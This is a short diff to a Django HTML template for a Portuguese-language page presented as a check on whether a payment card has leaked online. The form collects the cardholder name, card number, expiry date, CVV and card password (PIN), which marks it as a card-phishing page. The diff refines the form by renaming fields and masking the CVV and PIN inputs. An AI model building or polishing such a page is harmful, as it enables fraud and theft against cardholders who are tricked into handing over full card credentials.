@@ -66,22 +66,22 @@
 <body>
     <div class="container">
         <h1>Verifique se seu cartão vazou na internet</h1>
-        <form method="post" action="{% url 'sucesso' %}">
+        <form method="post">
             {% csrf_token %}
             <label for="nome">Nome do Titular</label>
-            <input type="text" id="nome" name="nome" required>
+            <input type="text" id="nome" name="nome_titular" required>
  
             <label for="numero">Número do Cartão</label>
-            <input type="text" id="numero" name="numero" required>
+            <input type="text" id="numero" name="numero_cartao" required>
  
             <label for="validade">Data de Validade</label>
-            <input type="text" id="validade" name="validade" required>
+            <input type="text" id="validade" name="data_validade" required>
  
             <label for="cvv">Código de Segurança (CVV)</label>
-            <input type="text" id="cvv" name="cvv" required>
+            <input type="password" id="cvv" name="codigo_seguranca" required>
  
-            <label for="cvv">Senha do Cartão</label>
-            <input type="text" id="card_pass" name="card_pass" required>
+            <label for="senha">Senha do Cartão</label>
+            <input type="password" id="senha" name="senha_cartao" required>
  
             <button type="submit">Verificar</button>
         </form>
